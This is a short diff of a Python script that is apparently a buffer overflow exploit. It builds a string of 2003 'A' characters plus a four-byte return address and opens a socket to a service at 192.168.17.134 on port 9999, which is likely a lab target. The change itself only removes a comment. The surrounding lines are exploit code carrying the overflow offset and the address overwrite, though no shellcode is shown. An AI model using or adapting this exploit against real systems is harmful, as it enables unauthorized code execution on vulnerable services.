@@ -5,7 +5,6 @@ import socket
 shell_code = 'A' * 2003 + "\xaf\x11\x50\x62"
 
 try:
-	#					IPV4			PORT
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(('192.168.17.134', 9999))
 
